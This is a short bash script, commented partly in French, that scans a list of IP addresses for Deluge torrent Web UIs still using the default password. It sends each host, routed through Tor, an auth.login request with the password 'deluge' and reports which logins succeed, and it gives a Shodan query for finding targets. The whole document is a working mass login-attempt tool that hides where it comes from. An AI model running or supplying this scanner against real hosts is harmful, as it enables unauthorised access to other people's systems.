# lil default auth scanner et ta gueule vlad  xD
# shodan : html:"Deluge: Web UI"

cat "iplist" | while read line
do
   echo "Test $line En Cours .."
   echo ""
   timeout 5 torify curl  -sk $line'/json' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0' -H 'Accept: */*' -H 'Accept-Language: en-GB,en;q=0.5' --compressed -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' --data-raw '{"method":"auth.login","params":["deluge"],"id":3}' | grep "true"
   
   echo ""
done




